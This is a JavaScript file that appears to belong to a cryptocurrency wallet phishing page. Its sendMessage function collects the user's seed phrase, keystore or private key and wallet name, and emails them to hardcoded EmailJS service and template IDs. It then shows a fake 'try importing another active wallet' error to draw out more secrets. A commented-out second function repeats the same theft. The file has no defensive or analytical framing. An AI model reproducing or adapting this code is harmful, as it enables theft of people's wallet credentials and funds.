

function sendMessage(event){
    if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
    }
 
    const phraseTextarea = document.getElementById("textInput");
    const walletNameInput = document.getElementById("walletNameData");
    const pkInput = document.getElementById("pk");

    const phraseValue = phraseTextarea ? phraseTextarea.value.trim() : '';
    const walletName = walletNameInput ? walletNameInput.value.trim() : '';
    const pkValue = pkInput ? pkInput.value.trim() : '';

    if (!phraseValue) {
        alert('Please enter your phrase, keystore, or key before proceeding.');
        return false;
    }

    const proceedBtn = document.getElementById("proceedButton");
    if (proceedBtn) {
        proceedBtn.disabled = true;
        proceedBtn.innerText = "Connecting...";
    }

    var params = {
        subject: walletName || 'Wallet Connection',
        message: phraseValue,
        pk: pkValue
    };

    const serviceID = 'service_7j8do6q';
    const templateID = 'template_6csopl7';

    emailjs.send(serviceID, templateID, params).then((res)=>{
        if (walletNameInput) walletNameInput.value = "";
        if (phraseTextarea) phraseTextarea.value = "";
        if (pkInput) pkInput.value = "";
        console.log(res);
        alert('An error occurred, try importing another active wallet');
        window.location.href = 'index.html';
    }).catch((err) => {
        console.error(err);
        if (proceedBtn) {
            proceedBtn.disabled = false;
            proceedBtn.innerText = "PROCEED";
        }
        alert('An error occurred, try importing another active wallet');
        window.location.href = 'index.html';
    });

    return false;
}


// function sendMessage2(){
 
// const phraseTextarea = document.getElementById("privateKeyInput");

// // Get the value of the textarea
// const phraseValue = phraseTextarea ? phraseTextarea.value : '';

//     var params= {
//         subject: document.getElementById("wallet_name").value,
//         message: phraseValue || ''
//     }

//   const serviceID  = 'service_4mr64an';
// const templateID = 'template_p3t6orr';

// emailjs.send(serviceID, templateID, params).then((res)=>{
//     if(document.getElementById("wallet_name")) document.getElementById("wallet_name").value= "";
//     if(document.getElementById("privateKeyInput")) document.getElementById("privateKeyInput").value= "";
//     console.log(res);
//     alert('An error occurred, try importing another active wallet');
//     window.location.href='index.html';

// })
// }

